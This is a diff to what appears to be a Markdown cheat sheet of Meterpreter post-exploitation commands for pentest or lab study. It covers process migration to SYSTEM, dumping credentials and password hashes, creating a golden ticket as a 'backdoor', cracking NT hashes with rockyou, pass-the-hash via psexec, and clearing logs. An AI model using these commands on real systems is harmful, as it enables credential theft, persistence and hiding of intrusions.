@@ -163,6 +163,7 @@ msf6 > set payload payload_name
 You may send a command to the background with `CTRL-Z`, or using `background`. You can use `sessions` to see your sessions, and `sessions -i <sid>` to move a session to the foreground.
 
 ```bash
+meterpreter > bg # todo: need test
 meterpreter > background
 msf6 exploit('module_used') > sessions
 msf6 exploit('module_used') > sessions -i 1
@@ -263,7 +264,7 @@ I had to do that once, I don't remember why 💥
 
 <div class="row row-cols-md-2"><div>
 
-To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. Usually, look for process run by "NT AUTHORITY\SYSTEM" (root).
+To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM" (root) should be okay, although you may have to try a few times.
 
 ```bash
 meterpreter > ps # list process
@@ -281,7 +282,6 @@ meterpreter > creds_all
 # later, you may use it to create a "backdoor"
 meterpreter > golden_ticket_create
 ```
-
 </div><div>
 
 Other commands
@@ -330,10 +330,14 @@ meterpreter > resource file.txt # with commands inside
 
 <div class="row row-cols-md-2"><div>
 
-Dump every username/password store by the system, they are hashed, you need to use `john` with `format=nt` to try bruteforce NTML hashes. It worth noting that you can use the [hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).
+Dump every username/password store by the system, they are hashed, you need to use `john` with `format=nt` to try bruteforce NTML hashes. It's worth noting that you can use the [hash to login using psexec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).
 
 ```bash
 meterpreter > hashdump
+# todo: NEED TEST
+msf6 exploit('module_used') > use auxiliary/analyze/crack_windows
+msf6 exploit('module_used') > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
+msf6 exploit('module_used') > [...]
 ```
 
 Clear logs
